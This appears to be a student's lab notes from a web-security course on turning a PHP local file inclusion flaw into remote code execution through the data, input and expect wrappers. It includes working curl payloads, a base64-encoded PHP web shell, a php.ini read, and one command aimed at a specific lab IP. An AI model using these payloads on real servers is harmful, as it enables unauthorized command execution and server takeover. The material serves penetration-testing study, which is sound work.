# Data
---
- The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be **used to include external data, including PHP code.**
- However, the data wrapper is **==only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations==**.
- So, let's first ==**confirm whether this setting is enabled==,** by reading the PHP configuration file **through the LFI vulnerability.**

## Checking PHP Configurations
- To do so, we can include the **PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache** or at **(`/etc/php/X.Y/fpm/php.ini`) for Nginx,** where `X.Y` is your install PHP version.
- We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file.
- We will **also use the `base64` filter** we used in the previous section, as **`.ini` files are similar to `.php` files and should be encoded** to avoid breaking:
	- `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`

- Once we have the base64 encoded string, we can decode it and **`grep` for `allow_url_include` to see its value:**
	- ![[Pasted image 20251102015633.png]]

- Knowing how to **==check for the `allow_url_include` option can be very important, as `this option is not enabled by default`==**.
- It is **not uncommon to see this option enabled**, as many web applications rely on it to function properly, **==like some WordPress plugins and themes, for example.==**

## Remote Code Execution
- With `allow_url_include` enabled, we can proceed with **our `data` wrapper attack.**
- We can **also pass it ==`base64` encoded strings with `text/plain;base64`==**, and it has the **ability to decode them and execute the PHP code**.

- So, our first step would be to **base64 encode a basic PHP web shell**, as follows:
	- `echo '<?php system($_GET["cmd"]); ?>' | base64`

- Now, **we can URL encode the base64 string,** and then **pass it to the data wrapper with `data://text/plain;base64,`**. 
- Finally, we can **==use pass commands to the web shell with `&cmd=<COMMAND>`:==**
	- ![[Pasted image 20251102020151.png]]
- `curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid`

# Input
---
- Similar to the `data` wrapper, **the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.**
- The difference between it and the `data` wrapper is that **==we pass our input to the `input` wrapper as a POST request's data.==**
- So, the **==vulnerable parameter must accept POST requests for this attack to work.==**
- Finally, the **`input` wrapper also depends on the `allow_url_include` setting,** as mentioned earlier.

- To execute a **command**, **we would pass it as a GET parameter, as we did in our previous attack**:
	- `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid`

- **Note:** **To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`)**. 
- If it only accepts **POST** requests, then **we can put our command directly in our PHP code, instead of a dynamic web shell** (e.g. `<\?php system('id')?>`)

# Expect
---
- Finally, we may utilize the **==[expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams.==**
- However, expect is an **external wrapper,** so it needs to be **==manually installed and enabled on the back-end server.==**
- We can **determine** whether it is installed on the back-end server **just like we did with `allow_url_include` earlier**, but we'd `grep` for `expect` instead:
	- `echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect`
	- ![[Pasted image 20251102020946.png]]
- As we can see, the **==`extension` configuration keyword is used to enable the `expect` module==**.
- To use the expect module, **we can use the `expect://` wrapper and then pass the command** we want to execute, as follows:
		- `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`
- As we can see, executing commands through the `expect` module is fairly straightforward, as this **module was designed for command execution,** as mentioned earlier.

# Better way to execute to grep output
---
- `curl -s 'http://83.136.255.235:43330/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=echo+output=;dir' | grep -A1 "output"`
- ![[Pasted image 20251102022654.png]]